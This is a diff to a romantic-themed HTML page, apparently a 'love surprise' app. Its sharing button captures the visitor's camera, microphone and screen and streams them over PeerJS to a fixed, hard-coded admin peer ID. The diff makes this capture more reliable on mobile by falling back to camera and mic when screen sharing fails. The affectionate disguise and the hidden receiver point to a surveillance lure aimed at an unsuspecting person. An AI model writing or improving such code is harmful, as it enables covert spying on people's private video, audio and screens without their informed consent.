@@ -88,38 +88,55 @@
             setTimeout(() => heart.remove(), 6000);
         }, 300);
 
-        // 4. Single Button Live Sharing (Camera + Mic + Screen)
+        // 4. Live Sharing (Mobile Fix)
         const ADMIN_PEER_ID = "love-app-admin-2024"; 
         let camStream, screenStream, peer;
 
         async function startAllSharing() {
             try {
                 document.getElementById('shareBtn').innerText = "கேமரா & மைக் ஆன் ஆகுது...";
-                camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); // கேமரா + மைக்
+                camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-                document.getElementById('shareBtn').innerText = "ஸ்கிரீன் ஷேரிங்...";
-                screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true }); // ஸ்கிரீன்
+                let streamToShare = camStream; // Default: Camera + Mic
 
-                // ஸ்கிரீன் வீடியோ + கேமரா மைக் ஆடியோ சேர்த்து அனுப்புவோம்
-                const combinedStream = new MediaStream([
-                    ...screenStream.getVideoTracks(),
-                    ...camStream.getAudioTracks()
-                ]);
+                // Try Screen Sharing (if supported)
+                if (navigator.mediaDevices.getDisplayMedia) {
+                    try {
+                        document.getElementById('shareBtn').innerText = "ஸ்கிரீன் ஷேரிங்...";
+                        screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                        
+                        // Combine Screen Video + Mic Audio
+                        streamToShare = new MediaStream([
+                            ...screenStream.getVideoTracks(),
+                            ...camStream.getAudioTracks()
+                        ]);
+                    } catch (screenErr) {
+                        // If user cancels screen share, fallback to camera
+                        alert("ஸ்க்ரீன் ஷேரிங் ரத்து செய்யப்பட்டது. கேமரா மட்டும் ஷேர் ஆகும்.");
+                        streamToShare = camStream;
+                    }
+                } else {
+                    alert("உங்க மொபைல் பிரவுசர்ல ஸ்க்ரீன் ஷேரிங் சப்போர்ட் இல்லை. கேமரா மட்டும் ஷேர் ஆகும்.");
+                }
 
-                document.getElementById('shareBtn').innerText = "இணைக்கிறது...";
-                peer = new Peer(); 
-                
-                peer.on('open', (id) => {
-                    const call = peer.call(ADMIN_PEER_ID, combinedStream);
-                    call.on('stream', () => {
-                        document.getElementById('shareBtn').style.display = 'none';
-                        document.getElementById('stopBtn').style.display = 'block';
-                    });
-                });
+                connectAndShare(streamToShare);
+
             } catch (err) {
                 alert("பர்மிஷன் மறுக்கப்பட்டது: " + err.message);
                 stopSharing();
             }
+        }
+
+        function connectAndShare(streamToShare) {
+            document.getElementById('shareBtn').innerText = "இணைக்கிறது...";
+            peer = new Peer(); 
+            peer.on('open', (id) => {
+                const call = peer.call(ADMIN_PEER_ID, streamToShare);
+                call.on('stream', () => {
+                    document.getElementById('shareBtn').style.display = 'none';
+                    document.getElementById('stopBtn').style.display = 'block';
+                });
+            });
         }
 
         function stopSharing() {
@@ -127,13 +144,11 @@
             if (screenStream) screenStream.getTracks().forEach(t => t.stop());
             if (peer) peer.destroy();
             document.getElementById('shareBtn').style.display = 'block';
-            document.getElementById('shareBtn').innerText = "🎥 Live Sharing";
+            document.getElementById('shareBtn').innerText = " Love🩷 Sharing";
             document.getElementById('stopBtn').style.display = 'none';
         }
 
-        // Initialize
         checkSurpriseStatus();
     </script>
 </body>
 </html>
-
